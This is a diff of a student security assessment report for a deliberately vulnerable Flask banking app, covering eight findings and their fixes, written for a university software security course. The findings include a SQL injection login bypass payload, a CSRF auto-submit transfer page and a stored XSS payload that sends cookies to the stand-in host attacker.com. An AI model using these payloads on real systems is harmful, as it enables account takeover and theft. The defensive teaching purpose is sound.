@@ -1,54 +1,52 @@
 # 8TechBank Security Assessment Report
 
-**Prepared by:** 
-1. AKOL PAUL 22/U/22453 2200722453
-2. AMPUMUZA AIJUKA 22/U/5766 220075766
-3. NTULUME WILSON 22/U/6739 220076739
-4. OCUNG ALLAN 22/U/22867 2200722867
-5. SSENTONGO HENRY ATANUS 22/U/3870/PS 220073870 
+**Prepared by:**
+1. AKOL PAUL — 22/U/22453 / 2200722453
+2. AMPUMUZA AIJUKA — 22/U/5766 / 220075766
+3. NTULUME WILSON — 22/U/6739 / 220076739
+4. OCUNG ALLAN — 22/U/22867 / 2200722867
+5. SSENTONGO HENRY ATANUS — 22/U/3870/PS / 220073870
 
-**Assessment Date:** June 2026  
-**Application Version:** 8TechBank v1.0 (Vulnerable) / v2.0 (Secure)  
-**Classification:** Academic — BSE 4202 Software Security Practical Assignment  
+**Assessment Date:** June 2026
+**Application Version:** 8TechBank v1.0 (Vulnerable) / v2.0 (Secure)
+**Classification:** Academic — BSE 4202 Software Security Practical Assignment
 **Lecturer:** Dr. Drake Patrick Mirembe
 
 ---
 
 ## Table of Contents
 
-1. Executive Summary
-2. Methodology
-3. Findings & Risk Analysis
-4. Remediation Summary
-5. OWASP ASVS Compliance Assessment
-6. Appendices
+1. [Executive Summary](#1-executive-summary)
+2. [Methodology](#2-methodology)
+3. [Findings and Risk Analysis](#3-findings-and-risk-analysis)
+4. [Remediation Summary](#4-remediation-summary)
+5. [OWASP ASVS Compliance Assessment](#5-owasp-asvs-compliance-assessment)
+6. [Appendices](#6-appendices)
 
 ---
 
 ## 1. Executive Summary
 
-8TechBank is a simulated online banking portal built with Python (Flask) and SQLite, featuring user registration, authentication, fund transfers, transaction history, and an administrative panel. This security assessment was commissioned to evaluate the application's security posture prior to any production deployment.
+8TechBank is a simulated online banking portal built with Python (Flask) and SQLite, featuring user registration, authentication, fund transfers, transaction history, and an administrative panel. This security assessment was conducted to evaluate the application's security posture prior to any production deployment.
 
-**Assessment Outcome: CRITICAL**
+**Overall Risk Rating: CRITICAL**
 
-The assessment identified **8 distinct vulnerabilities** across the application, ranging in severity from Critical (CVSS 9.8) to Medium (CVSS 5.3). The most severe findings — SQL injection enabling full authentication bypass and plaintext password storage — represent existential risks to the platform. An attacker exploiting these vulnerabilities could gain administrative access, drain all customer accounts, and exfiltrate every user credential in the database without detection.
-
-**Overall Risk Rating: 🔴 CRITICAL**
+The assessment identified 8 distinct vulnerabilities ranging in severity from Critical (CVSS 9.8) to Medium (CVSS 5.3). The most severe findings — SQL injection enabling full authentication bypass and plaintext password storage — represent existential risks to the platform. An attacker exploiting these vulnerabilities could gain administrative access, drain all customer accounts, and exfiltrate every user credential in the database without detection.
 
 | Severity | Count |
-|----------|-------|
-| 🔴 Critical (9.0–10.0) | 2 |
-| 🟠 High (7.0–8.9) | 3 |
-| 🟡 Medium (4.0–6.9) | 3 |
-| 🟢 Low (0.1–3.9) | 0 |
+|---|---|
+| Critical (9.0-10.0) | 2 |
+| High (7.0-8.9) | 3 |
+| Medium (4.0-6.9) | 3 |
+| Low (0.1-3.9) | 0 |
 
-**Top 3 Prioritised Recommendations for Executive Leadership:**
+**Top 3 Prioritised Recommendations:**
 
 1. **Immediately replace all SQL queries with parameterised statements.** A single SQL injection payload can bypass authentication and expose every customer record. This fix requires less than one hour of developer time and eliminates the highest-severity risk.
 
-2. **Migrate all stored passwords to bcrypt-hashed equivalents.** All user passwords are currently stored in plaintext. A database breach would expose every customer's credentials directly — likely the same passwords customers use for email and online banking elsewhere. Re-hashing requires a one-time migration script.
+2. **Migrate all stored passwords to bcrypt-hashed equivalents.** All user passwords are currently stored in plaintext. A database breach would expose every customer credential directly — likely reused across email and banking services elsewhere. Re-hashing requires a one-time migration script.
 
-3. **Deploy the hardened `src/secure/` application and decommission the vulnerable version.** The secure version addresses all 8 vulnerabilities. Until deployment is complete, the application must not be exposed beyond localhost.
+3. **Deploy the hardened secure application and decommission the vulnerable version.** The secure version addresses all 8 vulnerabilities. Until deployment is complete, the application must not be exposed beyond localhost.
 
 ---
 
@@ -56,137 +54,161 @@ The assessment identified **8 distinct vulnerabilities** across the application,
 
 ### Audit Approach
 
-This assessment was conducted following the **OWASP Testing Guide v4.2 (OTG)** methodology. The scope was limited to the 8TechBank application running on localhost — no production systems, third-party services, or university infrastructure were tested.
+This assessment was conducted following the OWASP Testing Guide v4.2 (OTG) methodology. The scope was limited to the 8TechBank application running on localhost — no production systems, third-party services, or university infrastructure were tested.
 
 The assessment combined two techniques:
 
-**Manual Code Review**  
+**Manual Code Review**
 The complete source code in `src/vulnerable/` was reviewed line-by-line against the OWASP Top 10 (2021) vulnerability taxonomy and the MITRE CWE database. Each route handler, template, and database interaction was examined for insecure patterns including string concatenation in SQL, missing output encoding, absent authentication decorators, and weak session configuration.
 
-**Dynamic Testing**  
-The application was run locally on port 5000, and each identified vulnerability was tested by executing proof-of-concept exploits:
-- Browser-based manual testing for XSS and IDOR
-- Python `requests` scripts for SQL injection and IDOR automation
-- A crafted HTML page for CSRF exploitation
-- Browser developer tools (Network tab, Application/Cookies) for session and header inspection
+**Dynamic Testing**
+The application was run locally on port 5000, and each identified vulnerability was tested by executing proof-of-concept exploits: browser-based manual testing for XSS and IDOR, Python `requests` scripts for SQL injection and IDOR automation, a crafted HTML page for CSRF exploitation, and browser developer tools for session and header inspection.
 
-**Tools Used:**
+### Tools Used
+
 - Python 3.x + `requests` library for scripted exploitation
 - Firefox/Chromium browser developer tools
 - SQLite3 CLI for direct database inspection
-- OWASP ZAP (for header validation)
+- OWASP ZAP for header validation
 
-**Scope:**
+### Scope
+
 - In scope: All routes in `src/vulnerable/app.py`, all templates in `src/vulnerable/templates/`
 - Out of scope: Network infrastructure, third-party libraries, operating system
+- Constraint: All exploitation conducted exclusively against owned hosted instances per the Computer Misuse Act, 2011 (Uganda)
+
+### Deployment URLs (Live)
+
+- Lab Launcher: https://8techbank-production-3100.up.railway.app/
+- Secure App: https://8techbank-production-2030.up.railway.app/
+- Vulnerable App: https://8techbank-production.up.railway.app/
 
 ---
 
-## 3. Findings & Risk Analysis
+## 3. Findings and Risk Analysis
 
-### Vulnerability Assessment Matrix (sorted by severity)
+### Vulnerability Assessment Matrix
 
-| # | Vulnerability | CWE | OWASP 2021 | CVSS v3.1 Score | Severity | Status |
-|---|--------------|-----|------------|-----------------|----------|--------|
-| 1 | SQL Injection in Login | CWE-89 | A03 Injection | 9.8 | 🔴 Critical | Fixed |
-| 2 | Plaintext Password Storage | CWE-256 | A02 Cryptographic Failures | 9.8 | 🔴 Critical | Fixed |
-| 3 | Missing CSRF Protection | CWE-352 | A01 Broken Access Control | 8.8 | 🟠 High | Fixed |
-| 4 | IDOR — Broken Access Control | CWE-639 | A01 Broken Access Control | 7.5 | 🟠 High | Fixed |
-| 5 | Session Misconfiguration | CWE-614 | A02 Cryptographic Failures | 7.5 | 🟠 High | Fixed |
-| 6 | Stored XSS in Transaction Notes | CWE-79 | A03 Injection | 5.4 | 🟡 Medium | Fixed |
-| 7 | Reflected XSS in Search | CWE-79 | A03 Injection | 6.1 | 🟡 Medium | Fixed |
-| 8 | Missing Security Headers | CWE-693 | A05 Security Misconfiguration | 5.3 | 🟡 Medium | Fixed |
+| # | Vulnerability | CWE | OWASP 2021 | CVSS v3.1 | Severity | Status |
+|---|---|---|---|---|---|---|
+| 1 | SQL Injection in Login | CWE-89 | A03 Injection | 9.8 | Critical | Fixed |
+| 2 | Plaintext Password Storage | CWE-256 | A02 Cryptographic Failures | 9.8 | Critical | Fixed |
+| 3 | Missing CSRF Protection | CWE-352 | A01 Broken Access Control | 8.8 | High | Fixed |
+| 4 | IDOR — Broken Access Control | CWE-639 | A01 Broken Access Control | 7.5 | High | Fixed |
+| 5 | Session Misconfiguration | CWE-614 | A02 Cryptographic Failures | 7.5 | High | Fixed |
+| 6 | Stored XSS in Transaction Notes | CWE-79 | A03 Injection | 5.4 | Medium | Fixed |
+| 7 | Reflected XSS in Search | CWE-79 | A03 Injection | 6.1 | Medium | Fixed |
+| 8 | Missing Security Headers | CWE-693 | A05 Security Misconfiguration | 5.3 | Medium | Fixed |
 
 ---
 
 ### Finding 1 — SQL Injection in Login
 
-**Risk Rating:** 🔴 CRITICAL  
-**CWE:** CWE-89 (Improper Neutralisation of Special Elements used in an SQL Command)  
-**OWASP Top 10:** A03:2021 — Injection  
-**File:** `src/vulnerable/app.py`  **Line:** 94  
-**CVSS v3.1 Score:** 9.8  
-**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
+| Field | Detail |
+|---|---|
+| Risk Rating | CRITICAL |
+| CWE | CWE-89 — Improper Neutralisation of Special Elements in an SQL Command |
+| OWASP Top 10 | A03:2021 — Injection |
+| File | `src/vulnerable/app.py` |
+| Line | 94 |
+| CVSS v3.1 Score | 9.8 |
+| CVSS Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
 
-**Description:**  
-The login endpoint constructs an SQL query by concatenating unsanitised user input directly into the query string. This allows an attacker to inject arbitrary SQL and manipulate the query logic.
+**Description**
 
-**Vulnerable Code (`src/vulnerable/app.py` line 94):**
+The login endpoint constructs an SQL query by concatenating unsanitised user input directly into the query string. This allows an attacker to inject arbitrary SQL and manipulate the query logic, bypassing authentication entirely.
+
+**Vulnerable Code**
+
 ```python
+# src/vulnerable/app.py line 94
 query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
 user = db.execute(query).fetchone()
 ```
 
-**Reproduction Steps:**
+**Reproduction Steps**
+
 1. Navigate to `http://localhost:5000/login`
 2. Enter `' OR '1'='1' --` in the username field; enter anything in the password field
 3. Submit the form
+4. Observe authentication bypass — dashboard is displayed without valid credentials
 
-**Expected vs Actual:**
-- Expected: Login fails — invalid credentials
-- Actual: User is authenticated as the first user in the database (authentication bypass)
+**Business Impact**
 
-**Screenshot:** `screenshots/exploit_a1_sqli_bypass.png` — dashboard shown after bypass  
-**Screenshot:** `screenshots/exploit_a2_sqli_union.png` — UNION payload response
+An unauthenticated attacker can log in as any user, including administrators, without knowing any password. They can then drain all accounts, delete users, and access all transaction records. A UNION-based payload can extract all usernames and passwords from the database in a single request.
 
-**Business Impact:**  
-An unauthenticated attacker can log in as any user (including administrators) without knowing any password. They can then drain all accounts, delete users, and access all transaction records. A UNION-based payload can extract all usernames and passwords from the database in a single request.
+**Screenshot references:** `screenshots/exploit_a1_sqli_bypass.png`, `screenshots/exploit_a2_sqli_union.png`
 
 ---
 
 ### Finding 2 — Plaintext Password Storage
 
-**Risk Rating:** 🔴 CRITICAL  
-**CWE:** CWE-256 (Plaintext Storage of a Password)  
-**OWASP Top 10:** A02:2021 — Cryptographic Failures  
-**File:** `src/vulnerable/app.py`  **Lines:** 76–79  
-**CVSS v3.1 Score:** 9.8  
-**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
+| Field | Detail |
+|---|---|
+| Risk Rating | CRITICAL |
+| CWE | CWE-256 — Plaintext Storage of a Password |
+| OWASP Top 10 | A02:2021 — Cryptographic Failures |
+| File | `src/vulnerable/app.py` |
+| Lines | 76-79 |
+| CVSS v3.1 Score | 9.8 |
+| CVSS Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
 
-**Description:**  
-User passwords are stored in the SQLite database as plaintext strings with no hashing or salting applied. Any attacker who gains read access to the database (via SQL injection, a compromised backup, or misconfigured file permissions) immediately obtains all user credentials.
+**Description**
 
-**Vulnerable Code (`src/vulnerable/app.py` lines 76–79):**
+User passwords are stored in the SQLite database as plaintext strings with no hashing or salting applied. Any attacker who gains read access to the database — via SQL injection, a compromised backup, or misconfigured file permissions — immediately obtains all user credentials.
+
+**Vulnerable Code**
+
 ```python
+# src/vulnerable/app.py lines 76-79
 username = request.form['username']
-password = request.form['password']  # No hashing applied
+password = request.form['password']  # no hashing applied
 db.execute('INSERT INTO users (username, password) VALUES (?, ?)', (username, password))
 ```
 
-**Reproduction Steps:**
+**Reproduction Steps**
+
 1. Register a user with password `mypassword123`
-2. Run `sqlite3 src/vulnerable/bank.db "SELECT username, password FROM users;"`
+2. Run: `sqlite3 src/vulnerable/bank.db "SELECT username, password FROM users;"`
 3. Observe the password stored verbatim: `alice|mypassword123`
 
-**Screenshot:** `screenshots/exploit_plaintext_db.png` — SQLite dump showing plaintext passwords
+**Business Impact**
 
-**Business Impact:**  
-Complete exposure of all user credentials on any database breach. High credential-stuffing risk given password reuse across services. Violates PCI-DSS Requirement 8.2.1 and GDPR Article 32 obligations to implement appropriate technical measures.
+Complete exposure of all user credentials on any database breach. High credential-stuffing risk given password reuse across services. Violates PCI-DSS Requirement 8.2.1 and GDPR Article 32 obligations to implement appropriate technical safeguards.
+
+**Screenshot reference:** `screenshots/exploit_plaintext_db.png`
 
 ---
 
 ### Finding 3 — Missing CSRF Protection on Fund Transfer
 
-**Risk Rating:** 🟠 HIGH  
-**CWE:** CWE-352 (Cross-Site Request Forgery)  
-**OWASP Top 10:** A01:2021 — Broken Access Control  
-**File:** `src/vulnerable/app.py`  **Lines:** 140–144  
-**CVSS v3.1 Score:** 8.8  
-**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`
+| Field | Detail |
+|---|---|
+| Risk Rating | HIGH |
+| CWE | CWE-352 — Cross-Site Request Forgery |
+| OWASP Top 10 | A01:2021 — Broken Access Control |
+| File | `src/vulnerable/app.py` |
+| Lines | 140-144 |
+| CVSS v3.1 Score | 8.8 |
+| CVSS Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
 
-**Description:**  
-State-changing POST endpoints (fund transfer, user registration) do not include or validate a CSRF token. The browser automatically attaches the victim's session cookie to any request targeting the application's origin — including requests triggered from a third-party page. An attacker can host a malicious page that silently submits a transfer form when opened by a logged-in victim.
+**Description**
 
-**Vulnerable Code (`src/vulnerable/app.py` lines 140–144):**
+State-changing POST endpoints (fund transfer, user registration) do not include or validate a CSRF token. The browser automatically attaches the victim's session cookie to any request targeting the application's origin, including requests triggered from a third-party page. An attacker can host a malicious page that silently submits a transfer form when opened by a logged-in victim.
+
+**Vulnerable Code**
+
 ```python
+# src/vulnerable/app.py lines 140-144
 if request.method == 'POST':
-    # No CSRF token check — any POST to /transfer executes
+    # no CSRF token check — any POST to /transfer executes
     to_account = request.form['to_account']
     amount     = float(request.form['amount'])
     note       = request.form['note']
 ```
 
-**Malicious Exploit Page (`exploits/csrf_attack.html`):**
+**Exploit Page (`exploits/csrf_attack.html`)**
+
 ```html
 <body onload="document.forms[0].submit()">
   <form action="http://localhost:5000/transfer" method="POST">
@@ -197,176 +219,225 @@ if request.method == 'POST':
 </body>
 ```
 
-**Reproduction Steps:**
-1. Log in as the victim user in your browser
-2. Open `exploits/csrf_attack.html` from the filesystem in the same browser session
-3. Observe that $1,000 is transferred to the attacker's account without any user interaction
+**Reproduction Steps**
 
-**Screenshot:** `screenshots/exploit_c_csrf_transfer.png` — transaction history showing the forged transfer
+1. Log in as the victim user
+2. Open `exploits/csrf_attack.html` in the same browser session
+3. Observe that $1,000 is transferred to the attacker account without user interaction
 
-**Business Impact:**  
+**Business Impact**
+
 Any logged-in customer who visits a malicious web page, opens a phishing email with an embedded image, or clicks a crafted link will unknowingly transfer funds to the attacker. The attack requires no credentials and leaves no obvious trace from the victim's perspective.
+
+**Screenshot reference:** `screenshots/exploit_c_csrf_transfer.png`
 
 ---
 
 ### Finding 4 — IDOR (Insecure Direct Object Reference)
 
-**Risk Rating:** 🟠 HIGH  
-**CWE:** CWE-639 (Authorisation Bypass Through User-Controlled Key)  
-**OWASP Top 10:** A01:2021 — Broken Access Control  
-**File:** `src/vulnerable/app.py`  **Lines:** 199–208  
-**CVSS v3.1 Score:** 7.5  
-**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
+| Field | Detail |
+|---|---|
+| Risk Rating | HIGH |
+| CWE | CWE-639 — Authorisation Bypass Through User-Controlled Key |
+| OWASP Top 10 | A01:2021 — Broken Access Control |
+| File | `src/vulnerable/app.py` |
+| Lines | 199-208 |
+| CVSS v3.1 Score | 7.5 |
+| CVSS Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |
 
-**Description:**  
+**Description**
+
 The `/account/<int:account_id>` endpoint retrieves account data by the ID passed in the URL without verifying that the requesting user owns that account. Any authenticated user can view any other user's account details by incrementing or guessing the account ID.
 
-**Vulnerable Code (`src/vulnerable/app.py` lines 199–208):**
+**Vulnerable Code**
+
 ```python
+# src/vulnerable/app.py lines 199-208
 @app.route('/account/<int:account_id>')
 def account(account_id):
     if 'user_id' not in session:
         return redirect(url_for('login'))
-    # No check: account_id == session['user_id']
-    db = get_db()
+    # no check: account_id == session['user_id']
     user = db.execute('SELECT * FROM users WHERE id=?', (account_id,)).fetchone()
     if user:
         return render_template('account.html', id=account_id, username=user[1], balance=user[3])
 ```
 
-**Reproduction Steps:**
+**Reproduction Steps**
+
 1. Log in as alice (account ID 1)
 2. Navigate to `http://localhost:5000/account/2`
-3. Bob's username and balance are displayed without authorisation
+3. Observe that bob's username and balance are displayed without authorisation
 
-**Screenshot:** `screenshots/exploit_d_idor.png` — alice's browser showing bob's account details
+**Business Impact**
 
-**Business Impact:**  
 All customer account balances and usernames are accessible to any authenticated user. An attacker with one account can enumerate all users and their balances by iterating account IDs from 1 upward.
+
+**Screenshot reference:** `screenshots/exploit_d_idor.png`
 
 ---
 
-### Finding 5 — Session Misconfiguration & Weak Secret Key
+### Finding 5 — Session Misconfiguration and Weak Secret Key
 
-**Risk Rating:** 🟠 HIGH  
-**CWE:** CWE-614 (Sensitive Cookie in HTTPS Session Without Secure Attribute)  
-**OWASP Top 10:** A02:2021 — Cryptographic Failures  
-**File:** `src/vulnerable/app.py`  **Line:** 12  
-**CVSS v3.1 Score:** 7.5  
-**CVSS Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`
+| Field | Detail |
+|---|---|
+| Risk Rating | HIGH |
+| CWE | CWE-614 — Sensitive Cookie in HTTPS Session Without Secure Attribute |
+| OWASP Top 10 | A02:2021 — Cryptographic Failures |
+| File | `src/vulnerable/app.py` |
+| Line | 12 |
+| CVSS v3.1 Score | 7.5 |
+| CVSS Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` |
 
-**Description:**  
-The application uses a hardcoded, trivially guessable secret key (`'secret'`) for signing Flask session cookies. Additionally, session cookies are not configured with `HttpOnly`, `Secure`, or `SameSite=Strict` flags, and there is no session timeout.
+**Description**
 
-**Vulnerable Code (`src/vulnerable/app.py` line 12):**
+The application uses a hardcoded, trivially guessable secret key (`'secret'`) for signing Flask session cookies. Session cookies are not configured with `HttpOnly`, `Secure`, or `SameSite=Strict` flags, and there is no session timeout.
+
+**Vulnerable Code**
+
 ```python
-app.secret_key = 'secret'  # Hardcoded, publicly known
-# Missing: SESSION_COOKIE_HTTPONLY, SESSION_COOKIE_SECURE, SESSION_COOKIE_SAMESITE, timeout
+# src/vulnerable/app.py line 12
+app.secret_key = 'secret'  # hardcoded, publicly known
+# missing: SESSION_COOKIE_HTTPONLY, SESSION_COOKIE_SECURE, SESSION_COOKIE_SAMESITE, timeout
 ```
 
-**Reproduction Steps:**
-1. Log in to the app
-2. Open browser DevTools → Application → Cookies
-3. The session cookie is present with no `HttpOnly`, `Secure`, or `SameSite` flags
-4. With the known secret key, the cookie can be forged using Flask's `itsdangerous` library
+**Reproduction Steps**
 
-**Screenshot:** `screenshots/exploit_session_cookie.png` — DevTools showing unprotected cookie flags
+1. Log in to the application
+2. Open browser DevTools > Application > Cookies
+3. Observe the session cookie has no `HttpOnly`, `Secure`, or `SameSite` flags
+4. Using the known secret key, forge a session token with Flask's `itsdangerous` library
 
-**Business Impact:**  
-The predictable secret key allows forging session tokens for arbitrary users, including admins. The missing `HttpOnly` flag allows JavaScript (via XSS) to read the cookie. The missing `Secure` flag allows interception over HTTP. Indefinite sessions mean a stolen cookie never expires.
+**Business Impact**
+
+The predictable secret key allows forging session tokens for arbitrary users including admins. The missing `HttpOnly` flag allows JavaScript (via XSS) to read the cookie. The missing `Secure` flag allows interception over HTTP. Indefinite sessions mean a stolen cookie never expires.
+
+**Screenshot reference:** `screenshots/exploit_session_cookie.png`
 
 ---
 
 ### Finding 6 — Stored XSS in Transaction Notes
 
-**Risk Rating:** 🟡 MEDIUM  
-**CWE:** CWE-79 (Improper Neutralisation of Input During Web Page Generation)  
-**OWASP Top 10:** A03:2021 — Injection  
-**File:** `src/vulnerable/templates/history.html`  **Line:** 151  
-**CVSS v3.1 Score:** 5.4  
-**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`
+| Field | Detail |
+|---|---|
+| Risk Rating | MEDIUM |
+| CWE | CWE-79 — Improper Neutralisation of Input During Web Page Generation |
+| OWASP Top 10 | A03:2021 — Injection |
+| File | `src/vulnerable/templates/history.html` |
+| Line | 151 |
+| CVSS v3.1 Score | 5.4 |
+| CVSS Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` |
 
-**Description:**  
-Transaction notes entered by users during fund transfers are stored in the database and rendered in the transaction history page using Jinja2's `| safe` filter, which disables HTML auto-escaping. Any JavaScript injected as a note executes in the browser of every user (and admin) who views the history page.
+**Description**
 
-**Vulnerable Template Code (`src/vulnerable/templates/history.html` line 151):**
+Transaction notes entered during fund transfers are stored in the database and rendered in the transaction history page using Jinja2's `| safe` filter, which disables HTML auto-escaping. Any JavaScript injected as a note executes in the browser of every user and admin who views the history page.
+
+**Vulnerable Code**
+
 ```html
+<!-- src/vulnerable/templates/history.html line 151 -->
 <div class="tx-note">{% if t[4] %}{{ t[4] | safe }}{% endif %}</div>
 ```
 
-**Exploit Payload:**
+**Exploit Payload**
+
 ```html
 <script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
 ```
 
-**Reproduction Steps:**
+**Reproduction Steps**
+
 1. Log in and navigate to `/transfer`
 2. Submit any transfer with the above payload in the Note field
 3. Log in as any other user and view `/history`
-4. The script executes and sends their session cookie to the attacker
+4. Observe the script executes and sends their session cookie to the attacker
 
-**Screenshot:** `screenshots/exploit_b2_stored_xss.png` — alert triggered on history page
+**Business Impact**
 
-**Business Impact:**  
 A single stored XSS payload affects all users who view transaction history, not just the injecting user. This is a wormable attack vector that can mass-harvest session tokens across the entire user base simultaneously.
+
+**Screenshot reference:** `screenshots/exploit_b2_stored_xss.png`
 
 ---
 
 ### Finding 7 — Reflected XSS in Search
 
-**Risk Rating:** 🟡 MEDIUM  
-**CWE:** CWE-79 (Improper Neutralisation of Input During Web Page Generation)  
-**OWASP Top 10:** A03:2021 — Injection  
-**File:** `src/vulnerable/templates/search.html`  **Line:** 131  
-**CVSS v3.1 Score:** 6.1  
-**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
+| Field | Detail |
+|---|---|
+| Risk Rating | MEDIUM |
+| CWE | CWE-79 — Improper Neutralisation of Input During Web Page Generation |
+| OWASP Top 10 | A03:2021 — Injection |
+| File | `src/vulnerable/templates/search.html` |
+| Line | 131 |
+| CVSS v3.1 Score | 6.1 |
+| CVSS Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` |
 
-**Description:**  
+**Description**
+
 The search page reflects the `q` URL parameter back into the HTML response using `{{ q | safe }}`, which bypasses Jinja2's built-in HTML escaping. An attacker can craft a URL containing JavaScript that executes when a logged-in victim clicks the link.
 
-**Vulnerable Template Code (`src/vulnerable/templates/search.html` line 131):**
+**Vulnerable Code**
+
 ```html
+<!-- src/vulnerable/templates/search.html line 131 -->
 <div class="result-meta-label">Results for <strong>"{{ q | safe }}"</strong></div>
 ```
 
-**Exploit Payload:**
+**Exploit Payload**
+
 ```
 http://localhost:5000/search?q=<script>alert(document.cookie)</script>
 ```
 
-**Reproduction Steps:**
+**Reproduction Steps**
+
 1. Ensure you are logged in
 2. Navigate to the above URL
-3. A JavaScript alert fires showing the session cookie value
+3. Observe a JavaScript alert fires showing the session cookie value
 
-**Screenshot:** `screenshots/exploit_b1_reflected_xss.png` — alert box showing cookie contents
+**Business Impact**
 
-**Business Impact:**  
 An attacker can craft a malicious link and distribute it via phishing to steal authenticated users' session cookies. The attacker then replays the cookie to impersonate the victim — no login required.
+
+**Screenshot reference:** `screenshots/exploit_b1_reflected_xss.png`
 
 ---
 
 ### Finding 8 — Missing Security Headers
 
-**Risk Rating:** 🟡 MEDIUM  
-**CWE:** CWE-693 (Protection Mechanism Failure)  
-**OWASP Top 10:** A05:2021 — Security Misconfiguration  
-**File:** `src/vulnerable/app.py`  **Lines:** 1–311 (no `after_request` handler present)  
-**CVSS v3.1 Score:** 5.3  
-**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`
+| Field | Detail |
+|---|---|
+| Risk Rating | MEDIUM |
+| CWE | CWE-693 — Protection Mechanism Failure |
+| OWASP Top 10 | A05:2021 — Security Misconfiguration |
+| File | `src/vulnerable/app.py` |
+| Lines | 1-311 (no `after_request` handler present) |
+| CVSS v3.1 Score | 5.3 |
+| CVSS Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N` |
 
-**Description:**  
-The application returns no browser security headers on any response. The absence of `Content-Security-Policy` allows inline script execution (enabling XSS). Missing `X-Frame-Options` allows the app to be embedded in an iframe for clickjacking. Missing `X-Content-Type-Options` allows MIME-sniffing attacks. Missing `Strict-Transport-Security` allows downgrade to HTTP.
+**Description**
 
-**Reproduction Steps:**
-1. Open browser DevTools → Network
+The application returns no browser security headers on any response. The absence of `Content-Security-Policy` allows inline script execution. Missing `X-Frame-Options` allows the app to be embedded in an iframe for clickjacking. Missing `X-Content-Type-Options` allows MIME-sniffing attacks. Missing `Strict-Transport-Security` allows downgrade to HTTP.
+
+**Vulnerable Code**
+
+```python
+# no @app.after_request handler present
+# headers absent: Content-Security-Policy, X-Frame-Options,
+#   X-Content-Type-Options, Strict-Transport-Security, Referrer-Policy
+```
+
+**Reproduction Steps**
+
+1. Open browser DevTools > Network
 2. Click any response and inspect the Headers tab
 3. Confirm none of the following are present: `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, `Referrer-Policy`
 
-**Screenshot:** `screenshots/exploit_no_headers.png` — DevTools response headers showing absence
+**Business Impact**
 
-**Business Impact:**  
 Absent security headers increase the impact of every other vulnerability. CSP absence allows XSS payloads to run. Clickjacking enables UI redress attacks where users unknowingly authorise transactions.
+
+**Screenshot reference:** `screenshots/exploit_no_headers.png`
 
 ---
 
@@ -374,21 +445,19 @@ Absent security headers increase the impact of every other vulnerability. CSP ab
 
 ### Fix 1 — Parameterised Queries (SQL Injection)
 
-**Vulnerability addressed:** Finding 1  
-**File:** `src/secure/app.py` lines 199–201
+**Vulnerability addressed:** Finding 1
 
-**Before (vulnerable):**
+**Before — `src/vulnerable/app.py` line 94**
+
 ```python
-# src/vulnerable/app.py line 94
 query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
 user = db.execute(query).fetchone()
 ```
 
-**After (secure):**
+**After — `src/secure/app.py` lines 199-206**
+
 ```python
-# src/secure/app.py line 199-206
-# Only query by username; verify password via bcrypt.checkpw — never include
-# the password in SQL so hash comparison happens in Python, not the DB.
+# query by username only; verify password via bcrypt.checkpw in Python
 user = db.execute(
     'SELECT * FROM users WHERE username = ?', (username,)
 ).fetchone()
@@ -398,23 +467,25 @@ if user and isinstance(stored_hash, str):
     stored_hash = stored_hash.encode('utf-8')
 if user and bcrypt.checkpw(password.encode('utf-8'), stored_hash):
     # authentication success
+    pass
 ```
 
-**Security Rationale:**  
+**Security Rationale**
+
 The `?` placeholder causes the database driver to send the query and parameters separately. The database treats the parameter as a data value, never as executable SQL, regardless of its content. The injection payload `' OR '1'='1' --` becomes a literal username string that simply finds no matching user.
 
-**Verification:** Running `sql_injection_poc.py` against the secure app (port 5001) — all three exploits return "Invalid credentials" or fail to redirect to the dashboard.
+**Verification:** Running `sql_injection_poc.py` against the secure app — all three exploits return "Invalid credentials" or fail to redirect to the dashboard.
 
-**Screenshot:** `screenshots/fix1_sqli_blocked.png` — login page returned after injection attempt
+**Screenshot reference:** `screenshots/fix1_sqli_blocked.png`
 
 ---
 
-### Fix 2 — Output Encoding & Content Security Policy (XSS)
+### Fix 2 — Output Encoding and Content Security Policy (XSS)
 
-**Vulnerability addressed:** Findings 6 and 7  
-**Files:** `src/secure/app.py` lines 257, 92–99; `src/secure/templates/`
+**Vulnerability addressed:** Findings 6 and 7
 
-**Before (vulnerable):**
+**Before**
+
 ```html
 <!-- src/vulnerable/templates/history.html line 151 -->
 <div class="tx-note">{{ t[4] | safe }}</div>
@@ -423,18 +494,21 @@ The `?` placeholder causes the database driver to send the query and parameters 
 Results for <strong>"{{ q | safe }}"</strong>
 ```
 
-**After (secure):**
+**After**
+
 ```python
-# src/secure/app.py line 257 — sanitise at storage time
+# sanitise at storage time — src/secure/app.py line 257
 note = html.escape(request.form.get('note', '').strip())[:255]
 ```
+
 ```html
-<!-- src/secure/templates — | safe filter removed; Jinja2 auto-escaping active -->
+<!-- templates: | safe filter removed; Jinja2 auto-escaping active -->
 <div class="tx-note">{{ note }}</div>
 Results for <strong>"{{ q }}"</strong>
